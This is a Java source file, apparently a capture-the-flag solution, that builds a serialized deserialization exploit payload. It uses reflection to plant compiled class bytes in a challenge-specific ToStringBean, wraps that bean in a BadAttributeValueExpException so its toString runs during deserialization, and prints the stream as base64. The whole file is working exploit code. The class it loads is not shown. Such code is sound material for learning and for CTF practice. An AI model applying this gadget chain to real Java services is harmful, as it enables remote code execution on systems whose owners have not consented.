import com.ezgame.ctf.tools.ToStringBean;
import com.ezgame.ctf.tools.Tools;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Exp{
    public static void main(String[] args) throws Exception{
        ToStringBean toStringBean = new ToStringBean();
        Field classByteField = toStringBean.getClass().getDeclaredField("ClassByte");
        classByteField.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("src/main/java/Test.class"));
        classByteField.set(toStringBean, bytes);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, toStringBean);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUTF("gadgets");
        objectOutputStream.writeInt(2021);
        objectOutputStream.writeObject(badAttributeValueExpException);
        byte[] bytes1 = byteArrayOutputStream.toByteArray();

        String payload = Tools.base64Encode(bytes1);
        System.out.println(payload);
    }
}